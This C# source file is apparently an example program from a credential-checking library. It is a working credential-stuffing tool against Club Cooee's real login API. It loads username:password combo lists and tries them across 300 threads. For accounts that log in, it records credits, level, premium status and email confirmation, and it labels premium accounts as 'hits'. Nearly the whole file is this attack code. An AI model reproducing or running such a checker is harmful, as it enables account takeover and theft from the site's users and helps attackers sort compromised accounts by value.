using Milky.Enums;
using Milky.Models;
using Newtonsoft.Json;
using System;
using System.Collections.Generic;
using System.IO;
using System.Net.Http;
using System.Threading;
using System.Threading.Tasks;

namespace Milky.Examples
{
    class Club_Cooee_Checker
    {
        static async Task Main()
        {
            var combos = new List<Combo>();

            foreach(string combo in File.ReadAllLines("combos.txt"))
            {
                string[] comboParts = combo.Split(':');

                if(!(comboParts.Length < 2))
                {
                    combos.Add(new Combo
                    {
                        Username = comboParts[0],
                        Password = comboParts[1]
                    });
                }
            }

            var check = new MilkyCheck()
                .WithCombos(combos)
                .WithSettings(new CheckSettings
                {
                    Threads = 300,
                    OutputInvalids = false
                })
                .WithCheckingProcess(async (combo, proxy) =>
                {
                    var result = CheckResult.Unknown;
                    var captures = new Dictionary<string, string>();

                    while(result == CheckResult.Unknown)
                    {
                        try
                        {
                            using var httpClient = new HttpClient();

                            using var requestMessage = new HttpRequestMessage(HttpMethod.Post, "https://en.clubcooee.com/api3/auth_login")
                            {
                                Content = new FormUrlEncodedContent(new Dictionary<string, string>
                                {
                                    { "username", combo.Username },
                                    { "password", combo.Password }
                                })
                            };

                            var responseMessage = await httpClient.SendAsync(requestMessage).ConfigureAwait(false);

                            using var content = responseMessage.Content;
                            var contentString = await content.ReadAsStringAsync().ConfigureAwait(false);
                            var jsonContent = JsonConvert.DeserializeObject<dynamic>(contentString);

                            if (!(bool)jsonContent.error)
                            {
                                dynamic user = jsonContent.msg.userdata.auth;

                                captures.Add("Cash", (string)user.credits);
                                captures.Add("Level", ((int)user.xp_level).ToString());
                                captures.Add("VIP", ((bool)user.premium).ToString());
                                captures.Add("Email confirmed", ((bool)user.email_confirmed).ToString());

                                result = (bool)user.premium ? CheckResult.Hit : CheckResult.Free;
                            }
                            else
                            {
                                result = CheckResult.Invalid;
                            }
                        }
                        catch { }
                    }

                    return (result, captures);
                });

            var console = new MilkyConsole()
                .WithCheck(check)
                .WithMeta(new Meta
                {
                    Name = "Club Cooee Checker",
                    Version = "1.0.0",
                    Author = "Laiteux"
                })
                .WithUpdateDelay(TimeSpan.FromMilliseconds(100));

            console.Start();
            await check.StartAsync();

            Thread.Sleep(-1);
        }
    }
}
